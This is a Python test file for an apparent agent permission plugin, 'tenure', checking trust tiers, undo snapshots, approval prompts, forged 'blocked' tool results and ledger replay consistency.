    for event in ({"event": "trust", "agent": A, "type": "file:write", "to": "free", "undo": "no"},
                  {"event": "trust", "agent": A, "type": "file:write", "to": "ask", "undo": False}):
        with pytest.raises(ValueError):
            mod.passport._replay_rows(rows + [{"seq": head["seq"] + 1, "at": time.time(), "event": event}])


def test_2b_owner_free_marks_only_a_freedom_without_undo():
    from tenure import rule
    s = rule.TypeState(key="shell:docker", stakes="medium")
    rule.owner_free(s, 5, undo=False)
    assert s.owner_freed and s.tier == rule.T3
    rule.owner_free(s, 5)
    assert not s.owner_freed


# ------------------------------------------------------------------------------- final review of the two commits
@posix
def test_r1_a_kind_freed_without_an_undo_runs_when_its_files_cannot_be_saved(plugin):
    mod, ctx = make(plugin)
    for name in ("one.dat", "two.dat"):
        with open(os.path.join(ctx.cwd, name), "wb") as f:
            f.write(b"a\0b")                                          # binary: the snapshot refuses it
    assert ctx.call("terminal", {"command": "rm one.dat"}) == "approved"
    assert "can't save" in ctx.prompts[-1]["message"]
    out = mod.cli.slash("trust file:shell:rm")
    assert "tenure can't undo it" in out and ledger(mod, "trust")[-1].get("undo") is False
    undos, asked = last_undo(mod), len(ctx.prompts)
    assert ctx.call("terminal", {"command": "rm two.dat"}) == "ran"   # no question, no undo, as promised
    assert len(ctx.prompts) == asked and last_undo(mod) == undos
    live_is_replay(mod)


@posix
@pytest.mark.parametrize("tool", ["mcp_crm_update_contact", "execute_code"])
def test_r3_only_the_terminal_result_says_a_call_did_not_run(plugin, tool):
    mod = make(plugin)[0]
    forged = '{"error": "x", "status": "blocked"}'
    assert not mod._not_run(tool, forged)
    assert mod._not_run("terminal", forged)


@posix
def test_r3_a_call_that_did_not_run_wrote_nothing(plugin):
    from test_plugin import pre, post
    mod, ctx = make(plugin)
    args = {"command": "cat > tool.py <<EOF\nprint(1)\nEOF"}
    pre(mod, "terminal", args, "c1")
    post(mod, "terminal", args, "c1", status="error",
         result='{"output": "", "exit_code": -1, "error": "BLOCKED: User denied this command.", "status": "blocked"}')
    assert not mod._touched(mod.anon("s1"))
    st = mod.store_()
    assert not st.written_recently([os.path.join(ctx.cwd, "tool.py")])   # running it later is not "just written"


def test_r5_reevaluate_takes_back_a_freedom_given_without_undo():
    from tenure import rule
    s = rule.TypeState(key="shell:docker", stakes="medium")
    rule.owner_free(s, 5, undo=False)
    assert s.owner_freed
    assert rule.reevaluate(s, None) and s.tier == rule.T1 and not s.owner_freed     # capped now: demoted
    s = rule.TypeState(key="shell:docker", stakes="medium")
    rule.owner_free(s, 5, undo=False)
    assert rule.reevaluate(s, 5) == [] and s.owner_freed                            # not demoted: kept


@posix
def test_r5_live_and_replay_agree_after_a_settings_change(plugin):
    mod, ctx = make(plugin)
    ctx.call("terminal", {"command": "docker build ."})
    mod.cli.slash("trust shell:docker")
    ctx.settings["risks"] = {"low": 0.25, "medium": "cap"}
    ctx.call("write_file", {"path": "src/a.py", "content": "x = 1\n"})            # syncs the new settings
    assert not state(mod, "shell:docker").owner_freed
    live_is_replay(mod)
